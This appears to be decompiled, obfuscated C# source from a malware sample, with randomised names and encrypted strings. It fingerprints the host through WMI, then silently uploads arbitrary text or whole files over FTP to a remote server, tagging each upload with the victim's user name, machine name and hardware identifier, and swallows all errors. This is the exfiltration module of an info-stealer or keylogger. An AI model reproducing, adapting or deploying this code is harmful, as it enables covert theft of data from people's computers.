using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace qYAjLWajCJpnf;

internal sealed class UuDMKkzrJStt
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string GtkPFNFnFTX()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107458804));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107458783)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107458734);
			ManagementObject val3 = new ManagementObject(getString_0(107458729) + text2 + getString_0(107459232));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107459227)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107350585) : text;
		}
	}

	public static void ztOsxsyMoKN(string efkQvwcndhFDDB = "URL", string rctuwkmhasIeW = "USERNAME", string dvNbyvdYIPDhpS = "ACCESO", string mDQQjJvbdl = "")
	{
		try
		{
			string text = GtkPFNFnFTX();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(efkQvwcndhFDDB + getString_0(107460527) + Environment.UserName + getString_0(107460546) + Environment.MachineName + getString_0(107459981) + text + getString_0(107459976));
			ftpWebRequest.Method = getString_0(107459202);
			ftpWebRequest.Credentials = new NetworkCredential(rctuwkmhasIeW, dvNbyvdYIPDhpS);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(mDQQjJvbdl);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void xLFYxlCXWb(string kZjKVzrMGrPyBYtfB = "URL", string iGToWFQHNacvHhs = "USERNAME", string zwCjunbPUBQKOnB = "ACCESO", string sQErFXcCuExpYz = "")
	{
		try
		{
			string text = GtkPFNFnFTX();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(kZjKVzrMGrPyBYtfB + getString_0(107460527) + Environment.UserName + getString_0(107460546) + Environment.MachineName + getString_0(107459981) + text + getString_0(107459981) + Path.GetFileName(sQErFXcCuExpYz));
			ftpWebRequest.Method = getString_0(107459202);
			ftpWebRequest.Credentials = new NetworkCredential(iGToWFQHNacvHhs, zwCjunbPUBQKOnB);
			byte[] array = File.ReadAllBytes(sQErFXcCuExpYz);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static UuDMKkzrJStt()
	{
		Strings.CreateGetStringDelegate(typeof(UuDMKkzrJStt));
	}
}
